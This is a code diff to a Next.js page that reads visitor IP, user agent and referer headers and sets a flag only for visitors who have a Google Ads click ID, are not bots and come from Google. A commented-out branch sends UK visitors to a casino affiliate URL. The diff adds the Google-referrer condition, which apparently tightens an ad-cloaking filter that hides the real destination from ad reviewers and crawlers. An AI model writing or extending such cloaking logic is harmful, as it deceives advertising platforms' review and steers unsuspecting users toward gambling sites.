@@ -18,6 +18,7 @@ export default async function Home({ searchParams }: PageProps) {
   // const gclid = Array.isArray(gclidParam) ? (gclidParam[0] || '') : (gclidParam || '');
   const headersList = await headers();
 
+
   const forwarded =
     headersList.get("x-forwarded-for") ||
     headersList.get("x-real-ip") ||
@@ -31,6 +32,8 @@ export default async function Home({ searchParams }: PageProps) {
   console.log('Gclid:', gclid);
   const userAgent = headersList.get("user-agent") || "";
   const referer = headersList.get("referer") || "";
+  const hasGoogleReferrer = referer.includes('google');
+
   console.log('referer:', referer);
   console.log('userAgent:', userAgent);
   // const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
@@ -70,7 +73,7 @@ export default async function Home({ searchParams }: PageProps) {
     }
   }
 
-  const isOnline= hasGclid && !isRobot;
+  const isOnline= hasGclid && !isRobot && hasGoogleReferrer;
   // if (isOnline && countryCode === 'GB') {
   //   redirect(`https://topbritcasinos.com/B7W2b6jr?utm_target=vegas&gclid=${gclid}`);
   // }
